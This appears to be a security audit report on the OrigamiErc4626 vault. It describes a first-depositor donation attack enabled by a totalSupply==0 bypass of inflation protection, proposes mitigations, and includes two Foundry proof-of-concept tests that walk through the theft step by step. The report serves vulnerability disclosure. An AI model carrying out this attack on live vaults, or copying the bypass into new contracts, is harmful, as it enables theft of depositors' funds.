# An attacker can front run the first depositor to inflate the share price, stealing almost all deposited value by the victim

Donation attacks are fairly common knowledge in the context of smart contract security. Even so that Openzeppelin's implementation of ERC4626 has a built in mechanism for that. In all the conversions from assets->shares and vice-versa, the calculation is done in the following way:


```solidity
    function _convertToShares(uint256 assets, Math.Rounding rounding) internal view virtual returns (uint256) {
        return assets.mulDiv(totalSupply() + 10 ** _decimalsOffset(), totalAssets() + 1, rounding);
    }

    function _convertToAssets(uint256 shares, Math.Rounding rounding) internal view virtual returns (uint256) {
        return shares.mulDiv(totalAssets() + 1, totalSupply() + 10 ** _decimalsOffset(), rounding);
    }
```

Even when the value of `_decimalsOffset()` is set to 0 (which is the default value), adding `+1` in both numerator and denominator makes the attack unprofitable. Even though the shares _can_ be inflated, the inflated value is not accessible by the attacker and is effectively lost. So there is a very high risk for the attacker, and therefore the likelyhood of the attack is very low.

However, `OrigamiErc4626` has a small modification in those two critical functions that bypass this protection mechanism in an special scenario: when `_totalSupply==0`.

```solidity
    function _convertToShares(uint256 assets, OrigamiMath.Rounding rounding) internal view virtual returns (uint256) {
        uint256 _totalSupply = totalSupply();
        // @audit-issue this special case of _totalSupply==0 bypasses the actual shares-inflation attack protection ... ?
        return _totalSupply == 0
            ? assets.scaleUp(_assetsToSharesScalar)
            : assets.mulDiv(_totalSupply + DECIMALS_OFFSET_SCALAR, totalAssets() + 1, rounding);
    }

    function _convertToAssets(uint256 shares, OrigamiMath.Rounding rounding) internal view virtual returns (uint256) {
        uint256 _totalSupply = totalSupply();
        return _totalSupply == 0
            ? shares.scaleDown(_assetsToSharesScalar, rounding)
            : shares.mulDiv(totalAssets() + 1, _totalSupply + DECIMALS_OFFSET_SCALAR, rounding);
    }
```

## Impact: medium/high

Once the vault is deployed, an attacker can frontrun the first honest depositor, and steal the full deposit of the victim. The attack can be repeated for multiple "first" depositors. 

Pre-conditions for the attack:
- `OrigamiErc4626` is deployed
- There are no default deposits made by the deployer because the attacker must be the first depositor 


### Risk classification

This issue has been classified as **high-risk** issue several times in the past:
- https://solodit.xyz/issues/h-02-first-depositor-can-break-minting-of-shares-code4rena-prepo-prepo-contest-git
- https://solodit.xyz/issues/h-03-stakedcitadel-depositors-can-be-attacked-by-the-first-depositor-with-depressing-of-vault-token-denomination-code4rena-badgerdao-badger-citadel-contest-git
- https://solodit.xyz/issues/m-10-new-galcx-token-denomination-can-be-depressed-by-the-first-depositor-code4rena-alchemix-alchemix-contest-git


However, I believe this classification is only valid in systems when the pool is deployed multiple times with a factory or similar. In this case, where the contract is deployed only once, the issue could be considered as **medium-risk** severity. 

However, the amount of assets that are at risk of this attack is not negligible. 

## Attack description

When no deposits have been made yet, and the first honest depositor initiates his transaction, 
the attacker front runs the honest deposit with:
- a deposit of a little amount (see PoC)
- a donation of `asset` to the contract

Then the hones deposit tx goes through, where assets are deposited, but no shares are minted. The depositor has lost his assets to the vault already. 

The second part of the attack is about getting the assets out of the vault. The attacker has to:
- Redeem his shares so that the `totalSupply == 0`, even though there are assets in the contract
- Make a new deposit (of a normal size), getting some shares minted to him
- Redeem those recently minted shares, which correspond to the majority of the assets in the vault (98% in the poc, where the 2% are the withdraw fees).

### Mitigation

1. Do not bypass the inflation-protection mechanism, even when `totalSupply==0`. 
2. Require a minimum deposit amount.
3. Revert if minted shares are 0 (to protect `alice`). I think this should be in place no matter what other mitigations are implemented.
4. Mint a small amount of shares to a dead address at deployment ($1 worth should be enough)

We can discuss further options. 

### Proof of code

The following proof of code proves that an `attacker` can frontrun `alice` and end up stealing almost all her deposit. 

To run it, add it to `test/foundry/unit/common/erc4626/OrigamiErc4626.t.sol::OrigamiErc4626TestPermit.t.sol`. 

EDIT: I added a second PoC. The original one explores the scenario when there are deposit/withdraw fees. The new one explores the scenario when there are no fees. The attack is valid in both cases. 

```solidity

contract OrigamiErc4626TestAttacks is OrigamiErc4626TestBase {

    function test_erc4626_donationAttack_withFees() public {
        // declarations
        address attacker = makeAddr("atacker");
        uint256 initialAttackerAssets = 15_000e18;
        
        // preparations & context
        deal(address(asset), alice, 5000e18);
        deal(address(asset), attacker, initialAttackerAssets);
        assertEq(vault.balanceOf(alice), 0);

        vm.prank(alice);
        asset.approve(address(vault), type(uint256).max);
        vm.prank(attacker);
        asset.approve(address(vault), type(uint256).max);

        // the attack beings. The attacker must be the first depositor of the vault, 
        // so he must front-run the first depositor (alice)  
        vm.prank(attacker);
        vault.deposit(3, attacker);
        // the first deposit gets scaled by 1, but some rounding-down cause the actual shares to be 1 less
        // the current share price after the first deposit is 2share=3assets 
        assertEq(vault.totalSupply(), 2);
        assertEq(vault.totalAssets(), 3);
        assertEq(vault.convertToShares(3), 2);

        // right after the deposit, the attacker makes a big donation of `asset` 
        // to inflate the share price
        vm.prank(attacker);
        asset.transfer(address(vault), 10_000e18);
        // Even though the price of 1 share should be inflated to around 5k (~10k assets for 2 shares), 
        // the inflation-protection mechanism and rounding directions makes it only 3333k
        assertEq(vault.convertToAssets(1), 3333_333333333333333334);
        // attacker still rightfully owns all shares in the vault
        assertEq(vault.totalSupply(), 2);
        assertEq(vault.balanceOf(attacker), vault.totalSupply());

        // An honest depositor deposits some amount of assets
        // The donation from the attacker should leave the share price just above 
        // the amount deposited by the honest depositor (3000 deposited < 3333 share price)
        // Alice receives then 0 shares, and the attacker still owns 100% of the totalSupply
        vm.prank(alice);
        vault.deposit(3000e18, alice);
        assertEq(vault.balanceOf(alice), 0);
        assertEq(vault.balanceOf(attacker), vault.totalSupply());

        // Thanks to the inflation-attack-protection inside convertToAssets(), 
        // even though the attacker owns 100% of the shares, 
        // only a portion of them can be withdrawn. The attacker is currently at a loss.
        assertEq(vault.maxWithdraw(attacker), 4333_333333333333333334);

        // However, the inflation-attack-protection is bypassed
        // when the totalSupply is back to 0, and the attacker owns the totalSupply.
        // Therefore he can redeem all the shares, leaving totalSupply=0 
        vm.startPrank(attacker);
        vault.redeem(vault.maxRedeem(attacker), attacker, attacker);
        assertEq(vault.totalSupply(), 0);
        assertEq(vault.balanceOf(attacker), 0);
        // Now that totalSupply==0, the attacker will get the same
        // number of shares as the assets deposited (except for the rounding-down)
        // All it takes to own again all assets is to make a new deposit (non-negligible deposit)
        vault.deposit(1000e18, attacker);

        // Now the attacker can withdraw the full balance from the vault (except 2% fees)
        assertEq(vault.totalSupply(), vault.balanceOf(attacker));
        assertApproxEqRel(vault.maxWithdraw(attacker), asset.balanceOf(address(vault)), 0.02e18);  // 2% fees

        // When the attacker redeems his shares, he has profited from alice
        vault.redeem(vault.maxRedeem(attacker), attacker, attacker);
        assertGt(asset.balanceOf(attacker), initialAttackerAssets);
        // to be more precise, he has now his initial supply, plus 2806, which is 93.3 % of alice assets
        assertEq(asset.balanceOf(attacker), initialAttackerAssets + 2806_666666666666666658);

        vm.stopPrank();
    }

    function test_erc4626_donationAttack_noFees() public {
        asset = new DummyMintableToken(origamiMultisig, "UNDERLYING", "UDLY", 18);
        vault = new MockErc4626VaultWithFees(
            origamiMultisig, 
            "VAULT",
            "VLT",
            asset,
            0, //DEPOSIT_FEE,
            0, // WITHDRAWAL_FEE,
            MAX_TOTAL_SUPPLY
        );
        vm.warp(100000000);

        // declarations
        address attacker = makeAddr("atacker");
        uint256 initialAttackerAssets = 15_000e18;
        
        // preparations & context
        deal(address(asset), alice, 5000e18);
        deal(address(asset), attacker, initialAttackerAssets);
        assertEq(vault.balanceOf(alice), 0);

        vm.prank(alice);
        asset.approve(address(vault), type(uint256).max);
        vm.prank(attacker);
        asset.approve(address(vault), type(uint256).max);

        // the attack beings. The attacker must be the first depositor of the vault, 
        // so he must front-run the first depositor (alice)  
        vm.prank(attacker);
        vault.deposit(1, attacker);
        // share price is 1:1
        assertEq(vault.totalSupply(), 1);
        assertEq(vault.totalAssets(), 1);
        assertEq(vault.convertToShares(1), 1);

        // right after the deposit, the attacker makes a big donation of `asset` 
        // to inflate the share price
        vm.prank(attacker);
        asset.transfer(address(vault), 10_000e18);
        // Inflation attack protection makes `convertToAssets` makes only 5k available to withdraw
        // So the attacker is at a loss now
        assertEq(vault.convertToAssets(1), 5000e18+1);
        // attacker still rightfully owns all shares in the vault
        assertEq(vault.totalSupply(), 1);
        assertEq(vault.balanceOf(attacker), vault.totalSupply());

        // An honest depositor deposits some amount of assets
        // The donation from the attacker should leave the share price just above 
        // the amount deposited by the honest depositor (3000 deposited < 5000 share price)
        // Alice receives then 0 shares, and the attacker still owns 100% of the totalSupply
        vm.prank(alice);
        vault.deposit(3000e18, alice);
        assertEq(vault.balanceOf(alice), 0);
        assertEq(vault.balanceOf(attacker), vault.totalSupply());

        // Thanks to the inflation-attack-protection inside convertToAssets(), 
        // even though the attacker owns 100% of the shares, 
        // only a portion of them can be withdrawn. The attacker is still at a loss.
        assertEq(vault.maxWithdraw(attacker), 6500_000000000000000001);

        // However, the inflation-attack-protection is bypassed
        // when the totalSupply is back to 0, and the attacker owns the totalSupply.
        // Therefore he can redeem all the shares, leaving totalSupply=0 
        vm.startPrank(attacker);
        vault.redeem(vault.maxRedeem(attacker), attacker, attacker);
        assertEq(vault.totalSupply(), 0);
        assertEq(vault.balanceOf(attacker), 0);
        // Now that totalSupply==0, the attacker will get the same
        // number of shares as the assets deposited (except for the rounding-down)
        // All it takes to own again all assets is to make a new deposit (non-negligible deposit)
        vault.deposit(1000e18, attacker);

        // Now the attacker can withdraw the full balance from the vault (except 2% fees)
        assertEq(vault.totalSupply(), vault.balanceOf(attacker));
        assertApproxEqRel(vault.maxWithdraw(attacker), asset.balanceOf(address(vault)), 0.02e18);  // 2% fees

        // When the attacker redeems his shares, he has profited from alice
        vault.redeem(vault.maxRedeem(attacker), attacker, attacker);
        assertGt(asset.balanceOf(attacker), initialAttackerAssets);
        // to be more precise, he has now his initial supply, alice deposit (except for 7 wei)
        assertEq(asset.balanceOf(attacker), initialAttackerAssets + 2999_999999999999999993);
        
        vm.stopPrank();
    }
}
```
